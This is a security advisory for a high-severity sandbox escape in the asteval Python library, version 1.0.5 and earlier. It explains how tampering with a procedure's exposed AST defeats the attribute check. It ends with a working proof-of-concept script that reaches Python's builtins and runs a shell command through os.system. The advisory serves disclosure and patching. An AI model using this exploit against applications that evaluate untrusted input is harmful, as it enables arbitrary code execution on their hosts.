# ASTEVAL Allows Malicious Tampering of Exposed AST Nodes Leads to Sandbox Escape

**GHSA**: GHSA-vp47-9734-prjw | **CVE**: N/A | **Severity**: high (CVSS 8.4)

**CWE**: CWE-367, CWE-749

**Affected Packages**:
- **asteval** (pip): <= 1.0.5

## Description

### Summary
If an attacker can control the input to the asteval library, they can bypass its safety restrictions and execute arbitrary Python code within the application's context.

### Details
The vulnerability is rooted in how `asteval` performs attribute access verification. In particular, the [`on_attribute`](https://github.com/lmfit/asteval/blob/8d7326df8015cf6a57506b1c2c167a1c3763e090/asteval/asteval.py#L565) node handler prevents access to attributes that are either present in the `UNSAFE_ATTRS` list or are formed by names starting and ending with `__`, as shown in the code snippet below:

```py
    def on_attribute(self, node):    # ('value', 'attr', 'ctx')
        """Extract attribute."""

        ctx = node.ctx.__class__
        if ctx == ast.Store:
            msg = "attribute for storage: shouldn't be here!"
            self.raise_exception(node, exc=RuntimeError, msg=msg)

        sym = self.run(node.value)
        if ctx == ast.Del:
            return delattr(sym, node.attr)
        #
        unsafe = (node.attr in UNSAFE_ATTRS or
                 (node.attr.startswith('__') and node.attr.endswith('__')))
        if not unsafe:
            for dtype, attrlist in UNSAFE_ATTRS_DTYPES.items():
                unsafe = isinstance(sym, dtype) and node.attr in attrlist
                if unsafe:
                    break
        if unsafe:
            msg = f"no safe attribute '{node.attr}' for {repr(sym)}"
            self.raise_exception(node, exc=AttributeError, msg=msg)
        else:
            try:
                return getattr(sym, node.attr)
            except AttributeError:
                pass
```

While this check is intended to block access to sensitive Python dunder methods (such as `__getattribute__`), the flaw arises because instances of the `Procedure` class expose their AST (stored in the `body` attribute) without proper protection:

```py
class Procedure:
    """Procedure: user-defined function for asteval.

    This stores the parsed ast nodes as from the 'functiondef' ast node
    for later evaluation.

    """

    def __init__(self, name, interp, doc=None, lineno=0,
                 body=None, args=None, kwargs=None,
                 vararg=None, varkws=None):
        """TODO: docstring in public method."""
        self.__ininit__ = True
        self.name = name
        self.__name__ = self.name
        self.__asteval__ = interp
        self.raise_exc = self.__asteval__.raise_exception
        self.__doc__ = doc
        self.body = body
        self.argnames = args
        self.kwargs = kwargs
        self.vararg = vararg
        self.varkws = varkws
        self.lineno = lineno
        self.__ininit__ = False
```

Since the `body` attribute is not protected by a naming convention that would restrict its modification, an attacker can modify the AST of a `Procedure` during runtime to leverage unintended behaviour.

The exploit works as follows:

1. **The Time of Check, Time of Use (TOCTOU) Gadget:**

   In the [code](https://github.com/lmfit/asteval/blob/8d7326df8015cf6a57506b1c2c167a1c3763e090/asteval/asteval.py#L577) below, a variable named `unsafe` is set based on whether `node.attr` is considered unsafe:

   ```python
   unsafe = (node.attr in UNSAFE_ATTRS or
             (node.attr.startswith('__') and node.attr.endswith('__')))
   ```

2. **Exploiting the TOCTOU Gadget:**

   An attacker can abuse this gadget by hooking any `Attribute` AST node that is not in the `UNSAFE_ATTRS` list. The attacker modifies the `node.attr.startswith` function so that it points to a custom procedure. This custom procedure performs the following steps:
   
   - It replaces the value of `node.attr` with the string `"__getattribute__"` and returns `False`.
   - Thus, when `node.attr.startswith('__')` is evaluated, it returns `False`, which causes the condition to short-circuit and sets `unsafe` to `False`.
   - However, by that time, `node.attr` has been changed to `"__getattribute__"`, which will be used in the subsequent `getattr(sym, node.attr)` call. An attacker can then use the obtained reference to `sym.__getattr__`to retrieve malicious attributes without needing to pass the `on_attribute` checks.

### PoC
The following proof-of-concept (PoC) demonstrates how this vulnerability can be exploited to execute the `whoami` command on the host machine:

```py
from asteval import Interpreter
aeval = Interpreter()
code = """
ga_str = "__getattribute__"
def lender():
    a
    b
def pwn():
    ga = lender.dontcare
    init = ga("__init__")
    ga = init.dontcare
    globals = ga("__globals__")
    builtins = globals["__builtins__"]
    importer = builtins["__import__"]
    importer("os").system("whoami")

def startswith1(str):
    # Replace the attr on the targeted AST node with "__getattribute__"
    pwn.body[0].value.attr = ga_str
    return False    

def startswith2(str):
    pwn.body[2].value.attr = ga_str
    return False    

n1 = lender.body[0]
n1.startswith = startswith1
pwn.body[0].value.attr = n1

n2 = lender.body[1]
n2.startswith = startswith2
pwn.body[2].value.attr = n2

pwn()
"""
aeval(code)
```
